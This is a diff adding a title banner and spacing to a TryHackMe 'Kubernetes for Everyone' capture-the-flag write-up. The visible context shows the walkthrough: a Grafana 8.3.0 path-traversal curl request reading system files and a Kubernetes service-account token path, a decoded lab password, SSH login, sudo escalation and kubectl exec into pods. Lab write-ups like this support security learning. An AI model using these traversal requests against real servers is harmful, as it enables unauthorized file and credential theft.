@@ -1,3 +1,17 @@
+
+<div align="center">
+
+<img src="https://cdn-images.tryhackme.com/room-icons/ae428610e9a2b37f8557e784006f1804.png" width="150">
+
+# Kubernetes for Everyone
+
+**Difficulty:** Medium  
+**Category:** Kubernetes / Cloud
+
+</div>
+
+---
+
 # Ports
 * 22
 * 111 rpcbind
@@ -73,6 +87,7 @@ gobuster dir -u http://10.80.151.3:5000 -w /usr/share/word/...
 ![temp](assets/20260701095950.png)
 
 Console shows me this:
+
 ![temp](assets/20260701100006.png)
 
 ## Python script for bruteforcing
@@ -99,7 +114,9 @@ for i in range(10000):
 
 
 I found this in the page source:
+
 ![temp](assets/20260701100950.png)
+
 So the PIN may not be 4 integers.
 
 SECRET:42273G4Za3CJZAEJlVIt
@@ -113,6 +130,7 @@ I CANT GET THIS TO WORK
 
 
 ![temp](assets/20260701110211.png)
+
 Version 8.3.0
 
 One google search shows me "Directory Traversal and Arbitrary File Read"
@@ -127,6 +145,7 @@ curl --path-as-is http://10.80.181.84:3000/public/plugins/logs/../../../../../..
 ```
 
 ![temp](assets/20260702111612.png)
+
 Bingo!
 
 But the username we are looking for is neither "nobody" or "grafana"?
@@ -135,7 +154,9 @@ What is hereiamatctf907?
 ```bash
 curl --path-as-is http://10.80.181.84:3000/public/plugins/logs/../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
 ```
+
 ![temp](assets/20260702112237.png)
+
 Does not exist.
 * Error message says that the plugin could not find the file, it is the plugin that is vulnerable!
 
@@ -146,13 +167,17 @@ Trying to get ssh keys:
 * known_hosts, NO
 
 On the main website:
+
 ![temp](assets/20260702133028.png)
 
 View page source and "/static/css/main.css"
+
 ![temp](assets/20260702133112.png)
 
 The pastebin link takes me to a encoded message:
+
 ![temp](assets/20260702133215.png)
+
 OZQWO4TBNZ2A====
 ```bash
 echo "OZQWO4TBNZ2A====" | base32 -d
@@ -169,12 +194,15 @@ And the password was: "hereiamatctf907"
 ssh vagrant@10.80.176.193
 # with password works
 ```
+
 ![temp](assets/20260702133726.png)
 
 ```bash
 sudo -l
 ```
+
 ![temp](assets/20260702133949.png)
+
 ```bash
 sudo su
 ```
@@ -189,6 +217,7 @@ This hints towards something kubernetes-like ^
 ```bash
 ps aux
 ```
+
 ![temp](assets/20260702152547.png)
 
 Apparenly using `k0s`  "The zero friction Kubernetes"
@@ -220,6 +249,7 @@ k0s kubectl get pods -A
 To get all the available pods in all of the namespaces.
 
 "Pods are the smallest deployable computing units you can create and manage in kubernetes"
+
 ![temp](assets/20260702161726.png)
 
 I want to get onto the "kube-api"
@@ -229,18 +259,22 @@ k0s kubectl exec -it kube-api -- /bin/bash
 `-it` means "create tty" and "read from stdin" (Basically "make it a terminal")
 
 ![temp](assets/20260702162137.png)
+
 Cannot find the pod, other namespace?
 
 ```bash
 k0s kubectl get namespaces
 ```
+
 ![temp](assets/20260702162248.png)
 
 Now find out what namespace contains the api pod.
 ```bash
 k0s kubectl get pods -n kube-system
 ```
+
 ![temp](assets/20260702162336.png)
+
 Yuup!
 
 ```bash
@@ -256,6 +290,7 @@ git show <commit-id>
 
 k0s kubectl get pods -n internship internship-job-5drbm
 ```
+
 ![temp](assets/20260702164448.png)
 
 https://crackstation.net
